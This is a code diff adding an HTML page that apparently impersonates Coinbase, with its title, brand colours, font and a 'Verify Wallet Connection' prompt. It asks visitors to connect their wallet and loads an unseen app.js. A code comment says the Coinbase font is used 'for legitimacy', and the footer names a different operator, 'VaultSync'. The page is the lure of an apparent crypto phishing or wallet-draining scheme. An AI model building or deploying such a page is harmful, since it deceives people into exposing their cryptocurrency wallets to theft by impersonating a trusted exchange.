@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Coinbase | Wallet Authorization</title>
+    <!-- Using the exact font used by Coinbase for legitimacy -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --cb-blue: #0052ff;
+            --cb-dark-blue: #0a0b0d;
+            --cb-bg: #ffffff;
+            --cb-text: #0a0b0d;
+            --cb-text-muted: #5b616e;
+            --cb-border: #eceff1;
+        }
+
+        body {
+            background-color: var(--cb-bg);
+            color: var(--cb-text);
+            font-family: 'Inter', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        .vault-container {
+            text-align: center;
+            width: 100%;
+            max-width: 400px;
+            padding: 0 20px;
+        }
+
+        .logo-placeholder {
+            margin-bottom: 40px;
+            display: flex;
+            justify-content: center;
+        }
+
+        /* Coinbase branded circle shape */
+        .cb-logo-circle {
+            width: 48px;
+            height: 48px;
+            background-color: var(--cb-blue);
+            border-radius: 50%;
+        }
+
+        h1 {
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 12px;
+            letter-spacing: -0.5px;
+        }
+
+        p {
+            font-size: 15px;
+            color: var(--cb-text-muted);
+            line-height: 1.5;
+            margin-bottom: 32px;
+            padding: 0 20px;
+        }
+
+        .connect-btn {
+            background-color: var(--cb-blue);
+            color: white;
+            border: none;
+            padding: 16px 32px;
+            font-size: 16px;
+            font-weight: 600;
+            border-radius: 50px;
+            cursor: pointer;
+            width: 100%;
+            transition: background-color 0.2s;
+        }
+
+        .connect-btn:hover {
+            background-color: #0042cd;
+        }
+
+        .status-area {
+            margin-top: 20px;
+            font-size: 13px;
+            color: var(--cb-text-muted);
+            min-height: 20px;
+        }
+
+        .footer-security {
+            margin-top: 40px;
+            font-size: 11px;
+            color: #9ca3af;
+            line-height: 1.4;
+            padding: 0 10px;
+        }
+
+        .footer-links {
+            margin-top: 15px;
+            font-size: 11px;
+            color: #9ca3af;
+            text-decoration: none;
+            display: block;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="vault-container">
+        <div class="logo-placeholder">
+            <div class="cb-logo-circle"></div>
+        </div>
+        
+        <h1>Verify Wallet Connection</h1>
+        <p>To continue, please synchronize your Coinbase Wallet. This allows us to verify your digital asset holdings securely.</p>
+        
+        <button id="connectBtn" class="connect-btn">Connect Wallet</button>
+        
+        <div id="status" class="status-area"></div>
+        
+        <div class="footer-security">
+            <strong>Security Notice:</strong> VaultSync is an independent authorization portal. 
+            We will never ask for your private keys or recovery seed phrases. 
+            Always verify the URL before entering sensitive information.
+        </div>
+        
+        <a href="#" class="footer-links">Terms of Service & Privacy Policy</a>
+    </div>
+
+    <script type="module" src="app.js"></script>
+</body>
+</html>
